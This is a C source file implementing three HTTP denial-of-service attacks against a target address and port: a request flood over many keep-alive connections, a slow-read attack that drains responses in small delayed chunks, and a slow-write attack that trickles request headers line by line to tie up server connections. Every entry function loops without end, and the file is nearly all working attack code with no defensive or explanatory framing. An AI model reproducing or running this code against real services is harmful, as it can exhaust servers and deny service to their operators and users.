#include "common.h"

#define HTTP_RECVBUF 65536

static void mkhttprequest(struct bytevector *vec, const char *host, const char *url)
{
    bytevector_append_strnz(vec, "GET ");
    bytevector_append_strnz(vec, url);
    bytevector_append_strnz(vec, " HTTP/1.1\r\n");
    bytevector_append_strnz(vec, "Host: ");
    bytevector_append_strnz(vec, host);
    bytevector_append_strnz(vec, "\r\n");
    bytevector_append_strnz(vec, "Connection: keep-alive\r\n");
    bytevector_append_strnz(vec, "\r\n");
}



///// http flood

struct httpflood_conndata {
    int request_sent;
    const char *dataptr;
};
struct httpflood_pooldata {
    const char *request;
    struct counter counter;
    int request_per_conn;
    int final_wait;
};
static void httpflood_newconn(struct tcpconn *conn, struct tcppool *pool)
{
    //printf("new\n");
    struct httpflood_pooldata *pd = pool->pool_userdata;
    struct httpflood_conndata *cd = malloc(sizeof(struct httpflood_conndata));
    *cd = (struct httpflood_conndata) {
        .request_sent = 0,
        .dataptr = pd->request,
    };
    conn->conn_userdata = cd;
}
static int httpflood_onevent(struct tcpconn *conn, struct tcppool *pool)
{
    struct httpflood_pooldata *pd = pool->pool_userdata;
    struct httpflood_conndata *cd = conn->conn_userdata;
    if (cd->request_sent >= pd->request_per_conn) {
        //printf("close\n");
        return 0;
    }
    //printf("recv\n");
    static char buf[HTTP_RECVBUF];
    while (recv(conn->fd, buf, sizeof(buf), 0) > 0);
    //printf("send\n");
    while (1) {
        if (*cd->dataptr) {
            int r = send(conn->fd, cd->dataptr, strlen(cd->dataptr), 0);
            if (r < 0) return -1;
            cd->dataptr += r;
        }
        if (!*cd->dataptr) {
            counter_inc(&pd->counter);
            cd->dataptr = pd->request;
            cd->request_sent++;
            if (cd->request_sent >= pd->request_per_conn) {
                tcppool_delaysche(conn, pd->final_wait);
                return 1;
            }
        }
    }
}
static void httpflood_delconn(struct tcpconn *conn, struct tcppool *pool)
{
    //printf("del\n");
    free(conn->conn_userdata);
}
void http_flood(struct in_addr dstaddr, ushort dstport, const char *host, const char *url, int connections, int request_per_conn, int request_wait)
{
    struct tcppool pool;
    struct bytevector payload;
    bytevector_init(&payload);
    mkhttprequest(&payload, host, url);
    bytevector_dump(&payload);
    struct httpflood_pooldata pooldata;
    pooldata.request = bytevector_data(&payload);
    pooldata.request_per_conn = request_per_conn;
    pooldata.final_wait = request_wait;
    counter_reset(&pooldata.counter, "http requests");
    tcppool_init(&pool, dstaddr, dstport, connections, &pooldata, httpflood_newconn, httpflood_delconn, httpflood_onevent);
    while (1) tcppool_oneloop(&pool);
    tcppool_free(&pool);
    bytevector_free(&payload);
}





///// http slow read

struct httpslowread_conndata {
    struct timespec ts;
    const char *dataptr;
};
struct httpslowread_pooldata {
    const char *request;
    int read_size;
    int read_wait;
    int read_timeout;
};
static void httpslowread_newconn(struct tcpconn *conn, struct tcppool *pool)
{
    printf("new connection %p\n", conn);
    struct httpslowread_pooldata *pd = pool->pool_userdata;
    struct httpslowread_conndata *cd = malloc(sizeof(struct httpslowread_conndata));
    cd->dataptr = pd->request;
    clock_gettime(CLOCK_REALTIME, &cd->ts);
    conn->conn_userdata = cd;
    // FIXME: add this may cause EPOLLRDHUP not occur (unknown reason)
    //int v = 256;
    //setsockopt(conn->fd, SOL_SOCKET, SO_RCVBUF, &v, sizeof(v));
}
static int httpslowread_onevent(struct tcpconn *conn, struct tcppool *pool)
{
    struct httpslowread_pooldata *pd = pool->pool_userdata;
    struct httpslowread_conndata *cd = conn->conn_userdata;
    
    struct timespec ts;
    clock_gettime(CLOCK_REALTIME, &ts);
    if (pd->read_timeout > 0 && ts_minus(&ts, &cd->ts) > pd->read_timeout) {
        return 0;
    }
    
    if (!*cd->dataptr) cd->dataptr = pd->request;
    
    while (strlen(cd->dataptr)) {
        int r = send(conn->fd, cd->dataptr, strlen(cd->dataptr), 0);
        if (r < 0) return -1;   
        cd->dataptr += r;
    };
    
//    printf("slow read %p\n", conn);
    static char buf[HTTP_RECVBUF];
    assert(pd->read_size < sizeof(buf));
    int r = recv(conn->fd, buf, pd->read_size, 0);
    if (r == 0) return 0;
    tcppool_delaysche(conn, pd->read_wait);
    
    return r < 0 ? -1 : 1;
}
static void httpslowread_delconn(struct tcpconn *conn, struct tcppool *pool)
{
    printf("del connection %p\n", conn);
    free(conn->conn_userdata);
}
void http_slowread(struct in_addr dstaddr, ushort dstport, const char *host, const char *url, int connections, int read_size, int read_wait, int read_timeout)
{
    struct tcppool pool;
    struct bytevector payload;
    bytevector_init(&payload);
    mkhttprequest(&payload, host, url);
    bytevector_dump(&payload);
    struct httpslowread_pooldata pooldata = {
        .request = bytevector_data(&payload),
        .read_size = read_size,
        .read_wait = read_wait,
        .read_timeout = read_timeout,
    };
    tcppool_init(&pool, dstaddr, dstport, connections, &pooldata, httpslowread_newconn, httpslowread_delconn, httpslowread_onevent);
    while (1) tcppool_oneloop(&pool);
    tcppool_free(&pool);
    bytevector_free(&payload);
}





///// http slow write

struct httpslowwrite_conndata {
    struct timespec ts;
    const char *dataptr;
};
struct httpslowwrite_pooldata {
    const char *request;
    int write_wait;
};
static void httpslowwrite_newconn(struct tcpconn *conn, struct tcppool *pool)
{
    printf("new connection %p\n", conn);
    struct httpslowwrite_pooldata *pd = pool->pool_userdata;
    struct httpslowwrite_conndata *cd = malloc(sizeof(struct httpslowwrite_conndata));
    cd->dataptr = pd->request;
    conn->conn_userdata = cd;
}
static int httpslowwrite_onevent(struct tcpconn *conn, struct tcppool *pool)
{
    struct httpslowwrite_pooldata *pd = pool->pool_userdata;
    struct httpslowwrite_conndata *cd = conn->conn_userdata;
    
    // recv until no more data
    static char buf[HTTP_RECVBUF];
    while (recv(conn->fd, buf, sizeof(buf), 0) > 0);
    
    
    // send header line by line
    if (!*cd->dataptr) cd->dataptr = pd->request;
    int sendlen;
    const char *marker = strstr(cd->dataptr, "\r\n");
    if (marker) {
        sendlen = marker - cd->dataptr + 2;
    } else {
        sendlen = strlen(cd->dataptr);
    }
    while (sendlen > 0) {
        int r = send(conn->fd, cd->dataptr, sendlen, 0);
        if (r < 0) return -1;
        cd->dataptr += r;
        sendlen -= r;
    };
    tcppool_delaysche(conn, pd->write_wait);
    return 1;
}
static void httpslowwrite_delconn(struct tcpconn *conn, struct tcppool *pool)
{
    printf("del connection %p\n", conn);
    free(conn->conn_userdata);
}
void http_slowwrite(struct in_addr dstaddr, ushort dstport, const char *host, const char *url, int connections, int write_wait)
{
    struct tcppool pool;
    struct bytevector payload;
    bytevector_init(&payload);
    mkhttprequest(&payload, host, url);
    bytevector_dump(&payload);
    struct httpslowwrite_pooldata pooldata = {
        .request = bytevector_data(&payload),
        .write_wait = write_wait,
    };
    tcppool_init(&pool, dstaddr, dstport, connections, &pooldata, httpslowwrite_newconn, httpslowwrite_delconn, httpslowwrite_onevent);
    while (1) tcppool_oneloop(&pool);
    tcppool_free(&pool);
    bytevector_free(&payload);
}

